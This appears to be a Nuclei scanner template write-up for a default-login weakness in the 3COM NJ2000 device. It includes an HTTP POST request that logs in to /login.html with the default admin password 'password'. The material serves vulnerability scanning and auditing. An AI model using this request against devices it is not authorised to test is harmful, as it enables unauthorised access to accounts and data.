# Nuclei Template: 3COM NJ2000 - Default Login
**Template ID:** 3com-nj2000-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`3com-nj2000-default-login.yaml`)

## Vulnerability Information & PoC

## Description
3COM NJ2000 contains a default login vulnerability. Default admin login password of 'password' was found. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
POST /login.html HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

password=password
```

## References
- https://www.manualslib.com/manual/204158/3com-Intellijack-Nj2000.html?page=12
